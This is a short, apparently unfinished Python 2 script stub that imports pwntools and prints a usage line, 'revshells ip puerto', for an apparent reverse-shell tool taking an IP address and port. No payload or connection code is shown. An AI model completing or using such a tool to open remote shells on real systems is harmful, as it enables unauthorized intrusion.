#!/usr/bin/python

import sys
from pwn import *

if len(sys.argv) < 3:
    print ">revshells ip puerto"
    sys.exit()


